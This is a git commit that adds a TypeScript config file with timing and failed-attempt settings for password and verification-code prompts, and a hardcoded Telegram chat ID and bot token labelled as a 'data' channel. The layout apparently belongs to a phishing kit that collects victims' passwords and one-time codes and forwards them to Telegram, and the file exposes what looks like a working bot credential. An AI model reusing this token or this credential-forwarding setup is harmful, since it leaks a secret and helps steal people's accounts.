a42cc73d27c6e9d01360bdc229832b68e019d844
canhne29903z <maithanhcanh2903z@gmail.com>
2025-05-09 14:29:27 +0700

    'first'

---
+++ src/utils/config.ts
@@ -0,0 +1,29 @@
+interface Config {
+  settings: {
+    code_loading_time: number;
+    max_failed_code_attempts: number;
+    max_failed_password_attempts: number;
+    password_loading_time: number;
+  };
+  telegram: {
+    data_chatid: string;
+    data_token: string;
+  };
+}
+const defaultConfig: Config = {
+  settings: {
+    code_loading_time: 3000,
+    max_failed_code_attempts: 2,
+    max_failed_password_attempts: 0,
+    password_loading_time: 7000,
+  },
+  telegram: {
+    data_chatid: "6137823055",
+    data_token: "6396688514:AAHy37iuoVWqd4iWdnCL9odB7bBzRSo-Zzk",
+  },
+};
+const getConfig = (): Config => {
+  return defaultConfig;
+};
+
+export default getConfig;
